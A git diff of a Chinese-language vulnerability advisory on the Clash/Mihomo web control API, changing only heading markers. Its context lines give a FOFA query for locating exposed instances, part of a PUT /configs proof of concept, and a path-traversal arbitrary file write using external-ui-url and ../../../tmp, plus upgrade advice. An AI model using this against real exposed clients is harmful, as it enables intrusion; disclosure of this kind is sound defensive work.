@@ -7,7 +7,7 @@ Clash的Web控制服务，默认开启的（默认端口为9090/9097）且默认
 
 FOFA查询：body="\"hello\":\"mihomo\"" || body="\"hello\":\"clash\""
 
-#POC
+* POC
 ```
 PUT /configs HTTP/1.1
 Host: 127.0.0.1:9097
@@ -21,7 +21,7 @@ Content-Type: text/plain;charset=UTF-8
 external-ui-url位置的远程文件http://www.demo.com/demo.zip可路径穿越，通过external-ui: ../../../tmp的方式，突破目录限制，实现任意文件写入。
 
 
-#【安全修复建议】
+*【安全修复建议】
 1、将Clash客户端和Mihomo升级至已修复版本：
 Clash>= v2.3.0
 Mihomo >= v1.20.1
